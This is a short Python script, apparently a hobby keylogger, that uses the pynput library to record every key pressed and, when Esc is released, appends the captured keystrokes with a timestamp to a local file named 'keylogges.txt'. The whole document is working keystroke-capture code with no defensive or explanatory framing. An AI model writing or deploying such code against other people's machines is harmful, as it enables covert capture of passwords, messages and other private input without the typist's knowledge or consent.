from pynput.keyboard import Key, Listener
import datetime

k = []
def onpress(key):
    k.append(key)
    

def onrelase(key):
    if key == Key.esc:
        writefile(k)
        return False

def writefile(somekey):
    with open("keylogges.txt","a") as f:
        for i in somekey:
            if i == Key.space:
                f.write(" ")
            elif i == Key.esc:
                timenow = datetime.datetime.now()
                f.write(" --- on {}\n".format(timenow))
            else:
                pkey = str(i).replace("'",'')
                f.write(pkey)

with Listener(on_press=onpress,on_release=onrelase) as l:
    l.join()